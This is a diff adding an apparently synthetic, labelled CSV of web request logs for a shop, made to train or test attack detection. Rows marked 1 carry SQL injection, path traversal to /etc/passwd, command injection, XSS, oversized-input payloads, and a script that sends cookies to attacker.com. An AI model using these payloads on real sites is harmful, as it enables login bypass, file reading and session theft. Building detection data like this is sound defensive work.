@@ -1,0 +1,1501 @@
+timestamp,ip,method,path,payload,label
+07:20:30.9,10.0.0.79,POST,/auth/register,"{'csrf_token': 'ImeNICsn10RYCCIEk7jAK2oFEAfzTPe3pEFGPrFrKk'.uMG1d3tO.WM4ZFgpNEN2uayq8Add7Q7aNJ6eb, 'username': 'newuser23', 'email': 'a20@b.com', 'password': '9sxV$Fq5&Zyx', 'submit': 'Register'}",0
+07:20:33.6,10.0.0.146,GET,/product/2,,0
+07:20:35.1,192.168.1.18,GET,/auth/logout,,0
+07:20:36.9,10.0.0.146,POST,/auth/login,"{'csrf_token': 'ImT3KquVvKOjk0A5vSA5CGc7B76XzIHULVWFPFKqag'.v5ERV3Uv.mRUL0MKdmcZwoEsmXEYUVm0DjrIu, 'username': 'user53', 'password': 'KR2R07TPMws5', 'submit': 'Log in'}",0
+07:20:39.5,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:20:40.9,10.0.0.67,GET,/auth/register,,0
+07:20:43.0,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:20:44.8,192.168.1.104,GET,/product/1,,0
+07:20:47.5,192.168.1.50,GET,/auth/login,,0
+07:20:49.1,192.168.1.46,GET,/auth/register,,0
+07:20:51.2,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:20:53.5,192.168.1.50,POST,/auth/login,"{'csrf_token': 'Im5sRFh5V1fjrzxAzSEcma47w5dQbJp7UrOAy2Xx8q'.KQtmgeLr.-F7nbUj7eAsAXRiLYfr3ukgrCx9v, 'username': 'user77', 'password': 'sT7AL3y2qyIo', 'submit': 'Log in'}",0
+07:20:55.3,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:20:56.9,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:20:59.3,203.162.4.191,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:21:01.7,192.168.1.56,GET,/auth/login,,0
+07:21:03.7,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:21:05.3,203.162.4.191,GET,/,,0
+07:21:07.4,192.168.1.175,POST,/auth/register,"{'csrf_token': 'ImCE0LZHbJtul8cHJ2R2z99ywdsH8fPjBf4WBNc4bo'.PF59OJac.xmCNpL8tVl4IiFbsEPw_1D6tFZLv, 'username': 'newuser68', 'email': 'a84@b.com', 'password': 'NucNBYY8Lc@f', 'submit': 'Register'}",0
+07:21:08.9,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:21:10.9,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:21:13.1,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:21:14.7,192.168.1.175,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:21:17.4,192.168.1.28,GET,/order/cart,,0
+07:21:19.3,10.0.0.146,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:21:21.5,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:21:23.3,192.168.1.151,GET,/,,0
+07:21:25.6,192.168.1.104,POST,/auth/register,"{'csrf_token': 'ImoUEQSbIEUBR2MmjTcXvrogPKJtXJEIjI6vvxh7dX'.ndqbDYoX.xBOsV6wa9Fv9nmrtGlPxtGXdiApa, 'username': 'newuser55', 'email': 'a99@b.com', 'password': 'kyH10AThhiGv', 'submit': 'Register'}",0
+07:21:27.1,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:21:29.0,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:21:31.4,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:21:33.5,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:21:35.6,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:21:37.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:21:39.5,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:21:41.0,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:21:43.6,192.168.1.182,POST,/auth/register,"{'csrf_token': 'ImGDAcF1XselnQ2Litg3xSxjTTMH7oX9opsrXcXFfk'.rNxq3onz.i5dF9wWTF2WGe8r5zG1l6pCgvuam, 'username': 'newuser72', 'email': 'a77@b.com', 'password': 'cn5d**chaRCW', 'submit': 'Register'}",0
+07:21:45.3,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:21:47.5,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:21:49.7,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:21:51.7,192.168.1.12,GET,/auth/login,,0
+07:21:52.8,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:21:54.9,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:21:57.3,10.0.0.15,POST,/auth/register,"{'csrf_token': 'ImeiiRvdfP80Bt5Gr5u0DN7yGEUQDDepI4cfV2ELE9'.ncENpEZX.0jhjioQNejszxzM7CbWn9HFuSCp4, 'username': 'newuser39', 'email': 'a24@b.com', 'password': 'TyAsbe@O3^it', 'submit': 'Register'}",0
+07:21:58.9,203.162.4.191,GET,/product/1,,0
+07:22:01.6,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:22:03.5,10.0.0.146,GET,/,,0
+07:22:05.2,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:22:07.1,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:22:08.9,203.162.4.191,GET,/auth/register,,0
+07:22:10.9,10.0.0.28,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:22:12.8,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:22:14.8,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:22:16.8,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:22:19.3,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:22:21.7,10.0.0.106,GET,/product/2,,0
+07:22:23.1,192.168.1.151,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:22:25.3,192.168.1.167,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:22:27.1,192.168.1.12,GET,/auth/login,,0
+07:22:29.2,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:22:31.2,192.168.1.185,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:22:33.3,10.0.0.146,POST,/auth/login,"{'csrf_token': 'ImQHj3D86RCmdW1gmjHlLg8HgyZMjoPz5oOVHACzOM'.1JhPuDox.nhWZUwcOvqE9yIrkXv2SjzQ9Pp7s, 'username': 'user65', 'password': 'OPYz(3MG*KNA', 'submit': 'Log in'}",0
+07:22:35.5,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:22:37.1,203.162.4.190,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:22:39.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:22:41.0,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:22:43.2,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:22:45.0,10.0.0.15,GET,/order/myorders,,0
+07:22:47.6,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:22:48.9,10.0.0.176,POST,/auth/register,"{'csrf_token': 'ImJpIKHTwBSaiOkWRJoNHkAJwyG6lYMocQZkSrHTvz'.FRProJL0.UNkDasF0TSpttC53PHAY52FGtmmW, 'username': 'newuser58', 'email': 'a4@b.com', 'password': 'hp8l3Ca*igET', 'submit': 'Register'}",0
+07:22:50.8,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:22:53.4,203.162.4.191,GET,/order/cart,,0
+07:22:55.2,192.168.1.169,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:22:57.7,192.168.1.56,GET,/,,0
+07:22:59.0,10.0.0.15,POST,/auth/register,"{'csrf_token': 'ImoWtOTJ9ewbYfVHdACtfJj787pGVp53zGCtXM4iFw'.pQnSOVDy.NFGlD-sZfTPc-PNspAupF4p8dLNg, 'username': 'newuser87', 'email': 'a17@b.com', 'password': '2%kCEZ%#2l)1', 'submit': 'Register'}",0
+07:23:01.3,10.0.0.82,GET,/auth/register,,0
+07:23:03.4,10.0.0.79,GET,/auth/login,,0
+07:23:05.6,127.0.0.1,GET,/auth/logout,,0
+07:23:07.3,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:23:09.6,192.168.1.46,GET,/order/myorders,,0
+07:23:11.7,192.168.1.182,GET,/product/2,,0
+07:23:13.3,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:23:14.9,10.0.0.146,GET,/,,0
+07:23:16.8,192.168.1.50,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:23:19.3,192.168.1.50,GET,/,,0
+07:23:21.4,192.168.1.56,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:23:23.0,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:23:25.6,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:23:27.4,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:23:29.3,192.168.1.175,GET,/auth/login,,0
+07:23:30.8,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:23:33.0,192.168.1.104,POST,/auth/register,"{'csrf_token': 'ImD7hbzVOC1fcP0xVafAN8aMty1R27NN7yz5cc80La'.HvnXuNtU.IX5S-Uc8YJKmbFvdZrCO7ruY-kso, 'username': 'newuser66', 'email': 'a26@b.com', 'password': 'C8ckxE##npZZ', 'submit': 'Register'}",0
+07:23:35.0,192.168.1.144,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:23:37.7,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:23:39.2,192.168.1.141,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:23:41.4,203.162.4.190,GET,/order/cart,,0
+07:23:43.5,192.168.1.46,POST,/auth/register,"{'csrf_token': 'Im74b12dtvsjDx6dOtjUu7C4IDg0mVxMwOOnkdlx8G'.McrO8UR8.NXtq3--6qsvUtPxFpmPM2YmqwpHc, 'username': 'newuser11', 'email': 'a49@b.com', 'password': 'ff2SEc#C@4IH', 'submit': 'Register'}",0
+07:23:44.7,192.168.1.169,POST,/auth/register,"{'csrf_token': 'ImniUn2xajzhAGeA59APL0uq3bqcMtGo5PcEdQQ9ai'.pxMVTKFF.q-uX5_iG8TdGUETOHIJPdseM9SvM, 'username': 'newuser17', 'email': 'a26@b.com', 'password': 'hKtBVZkYSBQw', 'submit': 'Register'}",0
+07:23:47.3,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:23:49.1,10.0.0.106,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:23:51.3,192.168.1.18,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:23:53.4,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:23:55.6,10.0.0.28,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:23:57.3,192.168.1.167,POST,/search,{'query': 'iphone 15 pro max'},0
+07:23:59.0,192.168.1.165,GET,/auth/logout,,0
+07:24:01.0,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:24:03.5,192.168.1.28,GET,/auth/login,,0
+07:24:05.7,192.168.1.55,GET,/order/myorders,,0
+07:24:06.8,192.168.1.22,POST,/auth/login,"{'csrf_token': 'ImgOlsZvuDCsrECPslxtAxhIlPaybicIznLBEbtKxD'.t2m2mWlz.-3p1fhFBR1FAG5WZu9zE7c_vVoT8, 'username': 'user70', 'password': 'ylepye1VH(OI', 'submit': 'Log in'}",0
+07:24:09.6,192.168.1.22,GET,/auth/login,,0
+07:24:11.2,203.162.4.190,POST,/auth/login,"{'csrf_token': 'Im95zdGXN4X9XiDXXxUzoAiL5eUyedcz7ZBuyGzCTo'.pF2YTfAj.2HEEP15ZLvuY3n1yLV4qlpYjDorg, 'username': 'user67', 'password': '@ARGaK1$CXC7', 'submit': 'Log in'}",0
+07:24:13.2,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:24:15.2,192.168.1.197,POST,/auth/login,"{'csrf_token': 'ImhjyVc5VzTKuAr5wiSAY2oCZd76uA4ktcOobGYkjV'.o1T6wDEl.GqcG74etQtUE1Vi2JwJSbS0w3Jr2, 'username': 'user61', 'password': 'iXMPcpXS!7@T', 'submit': 'Log in'}",0
+07:24:17.2,10.0.0.66,GET,/auth/login,,0
+07:24:19.4,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:24:20.9,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:24:23.6,10.0.0.15,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:24:25.1,192.168.1.197,POST,/auth/register,"{'csrf_token': 'ImDF297nvaHuUgZscLMPp2yp6PvY9sTSlK0iF6X97J'.5FtQxkbx.7VdfIuZ1KE6YJDz9jx4B9LPxDLKF, 'username': 'newuser25', 'email': 'a95@b.com', 'password': '5@mvmSdRl^Ag', 'submit': 'Register'}",0
+07:24:27.6,10.0.0.67,GET,/auth/login,,0
+07:24:29.6,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:24:31.4,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:24:33.1,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:24:35.3,192.168.1.22,GET,/auth/logout,,0
+07:24:37.1,192.168.1.22,GET,/product/1,,0
+07:24:39.0,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:24:41.4,192.168.1.182,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:24:43.6,192.168.1.185,GET,/order/myorders,,0
+07:24:45.0,192.168.1.144,GET,/auth/register,,0
+07:24:47.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:24:49.3,192.168.1.12,GET,/product/1,,0
+07:24:51.5,10.0.0.106,GET,/order/cart,,0
+07:24:53.3,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:24:55.2,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:24:57.0,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:24:59.6,192.168.1.162,GET,/,,0
+07:25:01.4,192.168.1.56,GET,/order/myorders,,0
+07:25:03.0,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:25:05.5,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:25:07.1,192.168.1.18,GET,/auth/logout,,0
+07:25:09.7,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:25:11.5,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:25:12.8,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:25:14.8,192.168.1.169,GET,/product/2,,0
+07:25:17.5,192.168.1.56,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:25:19.3,10.0.0.82,GET,/auth/logout,,0
+07:25:21.5,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:25:23.3,192.168.1.50,GET,/auth/register,,0
+07:25:25.5,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:25:27.3,192.168.1.46,GET,/order/myorders,,0
+07:25:29.2,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:25:30.9,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:25:33.0,192.168.1.12,GET,/auth/logout,,0
+07:25:35.6,203.162.4.190,POST,/auth/register,"{'csrf_token': 'ImLuzYrJnlU8yhbgxWHF6A7TBhSkYqa636B5VHoIak'.0Kwmqrs9.leEjRmtQwUzFBsRkNQ6Y1Iih6hL-, 'username': 'newuser87', 'email': 'a48@b.com', 'password': '%6RzN!f31b6s', 'submit': 'Register'}",0
+07:25:37.4,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:25:38.8,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
